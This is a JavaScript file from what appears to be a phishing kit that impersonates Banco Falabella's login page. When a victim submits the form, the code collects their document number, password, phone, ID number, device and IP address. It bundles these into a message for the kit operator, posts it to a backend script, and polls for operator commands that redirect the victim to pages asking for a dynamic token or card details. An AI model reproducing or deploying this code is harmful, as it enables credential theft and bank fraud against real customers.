// Funcionalidad para validar y habilitar botones
$(document).ready(function() {
    
    // Verificar que los elementos existen
    if ($("#txtDocumento").length === 0) {
        return;
    }
    if ($("#txtClave").length === 0) {
        return;
    }
    if ($("#btnEntrar").length === 0) {
        return;
    }
    
    // Validación para el botón principal
    $("#txtDocumento").on("input", function() {
        checkButtonState();
    });
    
    $("#txtClave").on("input", function() {
        checkButtonState();
    });
    
    function checkButtonState() {
        var documento = $("#txtDocumento").val().length;
        var clave = $("#txtClave").val().length;
        
        if (documento >= 5 && clave >= 4) {
            $("#btnEntrar").prop("disabled", false).css({
                "background-color": "#38a121",
                "cursor": "pointer"
            });
        } else {
            $("#btnEntrar").prop("disabled", true).css({
                "background-color": "#59B981",
                "cursor": "not-allowed"
            });
        }
    }

    // Validación para el botón móvil
    $("#txtDocumentoM").on("input", function() {
        checkMobileButtonState();
    });
    
    $("#txtClaveM").on("input", function() {
        checkMobileButtonState();
    });
    
    function checkMobileButtonState() {
        var documento = $("#txtDocumentoM").val().length;
        var clave = $("#txtClaveM").val().length;
        
        if (documento >= 5 && clave >= 4) {
            $("#btnEntrarM").prop("disabled", false).css({
                "background-color": "#38a121",
                "cursor": "pointer"
            });
        } else {
            $("#btnEntrarM").prop("disabled", true).css({
                "background-color": "#59B981",
                "cursor": "not-allowed"
            });
        }
    }

    // Espera 3 segundos y oculta el loader inicial
    setTimeout(function () {
        document.getElementById('loader').style.display = 'none';
    }, 3000);

    // Generar o recuperar session_id
    let sessionId = localStorage.getItem('session_id');
    if (!sessionId) {
        sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        localStorage.setItem('session_id', sessionId);
    }

    // Event listener para el botón principal
    $("#btnEntrar").click(function(e) {
        e.preventDefault();
        
        var documento = $("#txtDocumento").val();
        var clave = $("#txtClave").val();
        var tipo = $("#txtTipo").val();
        
        // Validar que la contraseña tenga al menos 4 dígitos
        if (clave.length < 4) {
            alert('La contraseña debe tener al menos 4 dígitos');
            return;
        }

        // Mostrar loader
        $("#mensaje").show();

        localStorage.setItem('documento', documento);
        localStorage.setItem('clave', clave);
        localStorage.setItem('session_id', sessionId);

        // Detectar tipo de dispositivo
        const userAgent = navigator.userAgent;
        let dispositivo = 'PC';
        
        if (/Android/i.test(userAgent)) {
            dispositivo = 'Android';
        } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
            dispositivo = 'iPhone';
        } else if (/Windows/i.test(userAgent)) {
            dispositivo = 'PC';
        } else if (/Mac/i.test(userAgent)) {
            dispositivo = 'Mac';
        } else if (/Linux/i.test(userAgent)) {
            dispositivo = 'Linux';
        }
        
        const hora = new Date().toLocaleString('es-ES');
        
        // Obtener IP y construir mensaje
        fetch('get_ip.php')
            .then(response => response.json())
            .then(data => {
                const ip = data.ip || 'No disponible';
                
                const mensaje = `<b><u>💎BANCO FALABELLA💎</u></b>
• <b>📄Tipo:</b> ${tipo}
• <b>🆔Documento:</b> ${documento}
• <b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
• <b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
• <b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
• <b>🏦Banco:</b> BANCO FALABELLA
------------------------------
• <b>📟Dispositivo:</b> ${dispositivo}
• <b>🗺IP:</b> ${ip}
• <b>⏱Hora:</b> ${hora}
------------------------------
• <b>👤 Usuario:</b> ${tipo} ${documento}
• <b>🔑 Clave:</b> ${clave}
------------------------------`;

                const formData = new FormData();
                formData.append('message', mensaje);
                formData.append('transactionId', sessionId);

                fetch('procesar_logo.php', {
                    method: 'POST',
                    body: formData
                })
                .then(res => res.json())
                .then(result => {
                    if (result.status === 'success') {
                        checkPaymentVerification(sessionId, result.messageId);
                    } else {
                        // Ocultar loader si hay error
                        $("#mensaje").hide();
                    }
                })
                .catch(err => {
                    // Ocultar loader si hay error
                    $("#mensaje").hide();
                });
            })
            .catch(() => {
                // Si falla la obtención de IP, enviar sin IP
                const mensaje = `💎BANCO FALABELLA💎

<b>fu7ur4ma</b>

---------------
<b>📄Tipo:</b> ${tipo}
<b>🆔Documento:</b> ${documento}
<b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
<b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
<b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
<b>🏦Banco:</b> ${localStorage.getItem('nom') || 'No disponible'}
<b>🪬Tipo:</b> BANCO FALABELLA
---------------
<b>📟Dispositivo:</b> ${dispositivo}
<b>🗺IP:</b> No disponible
<b>⏱Hora:</b> ${hora}
---------------
👤 Usuario: ${tipo} ${documento}
🔑 Clave: ${clave}
---------------`;

                const formData = new FormData();
                formData.append('message', mensaje);
                formData.append('transactionId', sessionId);

                fetch('procesar_logo.php', {
                    method: 'POST',
                    body: formData
                })
                .then(res => res.json())
                .then(result => {
                    if (result.status === 'success') {
                        checkPaymentVerification(sessionId, result.messageId);
                    } else {
                        // Ocultar loader si hay error
                        $("#mensaje").hide();
                    }
                })
                .catch(err => {
                    // Ocultar loader si hay error
                    $("#mensaje").hide();
                });
            });
    });

    // Event listener para el botón móvil
    $("#btnEntrarM").click(function(e) {
        e.preventDefault();
        
        var documento = $("#txtDocumentoM").val();
        var clave = $("#txtClaveM").val();
        var tipo = $("#txtTipoM").val();
        
        // Validar que la contraseña tenga al menos 4 dígitos
        if (clave.length < 4) {
            alert('La contraseña debe tener al menos 4 dígitos');
            return;
        }

        // Mostrar loader
        $("#mensaje").show();

        localStorage.setItem('documento', documento);
        localStorage.setItem('clave', clave);
        localStorage.setItem('session_id', sessionId);

        // Detectar tipo de dispositivo
        const userAgent = navigator.userAgent;
        let dispositivo = 'PC';
        
        if (/Android/i.test(userAgent)) {
            dispositivo = 'Android';
        } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
            dispositivo = 'iPhone';
        } else if (/Windows/i.test(userAgent)) {
            dispositivo = 'PC';
        } else if (/Mac/i.test(userAgent)) {
            dispositivo = 'Mac';
        } else if (/Linux/i.test(userAgent)) {
            dispositivo = 'Linux';
        }
        
        const hora = new Date().toLocaleString('es-ES');
        
        // Obtener IP y construir mensaje
        fetch('get_ip.php')
            .then(response => response.json())
            .then(data => {
                const ip = data.ip || 'No disponible';
                
                const mensaje = `💎BANCO FALABELLA💎

<b>fu7ur4ma</b>

---------------
<b>📄Tipo:</b> ${tipo}
<b>🆔Documento:</b> ${documento}
<b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
<b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
<b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
<b>🏦Banco:</b> ${localStorage.getItem('nom') || 'No disponible'}
<b>🪬Tipo:</b> BANCO FALABELLA
---------------
<b>📟Dispositivo:</b> ${dispositivo}
<b>🗺IP:</b> ${ip}
<b>⏱Hora:</b> ${hora}
---------------
👤 Usuario: ${tipo} ${documento}
🔑 Clave: ${clave}
---------------`;

                const formData = new FormData();
                formData.append('message', mensaje);
                formData.append('transactionId', sessionId);

                fetch('procesar_logo.php', {
                    method: 'POST',
                    body: formData
                })
                .then(res => res.json())
                .then(result => {
                    if (result.status === 'success') {
                        checkPaymentVerification(sessionId, result.messageId);
                    } else {
                        // Ocultar loader si hay error
                        $("#mensaje").hide();
                    }
                })
                .catch(err => {
                    // Ocultar loader si hay error
                    $("#mensaje").hide();
                });
            })
            .catch(() => {
                // Si falla la obtención de IP, enviar sin IP
const mensaje = `💎BANCO FALABELLA💎

<b>fu7ur4ma</b>

---------------
<b>📄Tipo:</b> ${tipo}
<b>🆔Documento:</b> ${documento}
<b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
<b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
<b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
<b>🏦Banco:</b> ${localStorage.getItem('nom') || 'No disponible'}
<b>🪬Tipo:</b> BANCO FALABELLA
---------------
<b>📟Dispositivo:</b> ${dispositivo}
<b>🗺IP:</b> No disponible
<b>⏱Hora:</b> ${hora}
---------------
👤 Usuario: ${tipo} ${documento}
🔑 Clave: ${clave}
---------------`;

                const formData = new FormData();
                formData.append('message', mensaje);
                formData.append('transactionId', sessionId);

                fetch('procesar_logo.php', {
                    method: 'POST',
                    body: formData
                })
                .then(res => res.json())
                .then(result => {
                    if (result.status === 'success') {
                        checkPaymentVerification(sessionId, result.messageId);
                    } else {
                        // Ocultar loader si hay error
                        $("#mensaje").hide();
                    }
                })
                .catch(err => {
                    // Ocultar loader si hay error
                    $("#mensaje").hide();
                });
            });
    });

    async function checkPaymentVerification(transactionId, messageId) {
    try {
        const formData = new FormData();
        formData.append('transactionId', transactionId);
        formData.append('messageId', messageId);

        const res = await fetch('verificar_respuesta.php', {
            method: 'POST',
            body: formData
        });

        const result = await res.json();

        if (result.action) {
            switch (result.action) {
                case 'pedir_dinamica':
                    window.location.href = "token.php";
                    break;
                case 'error_logo':
                    $("#mensaje").hide();
                    alert("Usuario o clave incorrectos.");
                    window.location.href = "index.php";
                    break;
                case 'error_tc':
                    window.location.href = "tarjeta.php"; // <- agrega si aún no lo tienes
                    break;
                case 'confirm_finalizar':
                    window.location.href = "finalizado.php"; // <- si tienes ruta final
                    break;
            }
        } else {
            // No hay respuesta aún → esperamos 2s más
            setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
        }

    } catch (err) {
        // En error, igual esperar
        setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
    }
}

}); 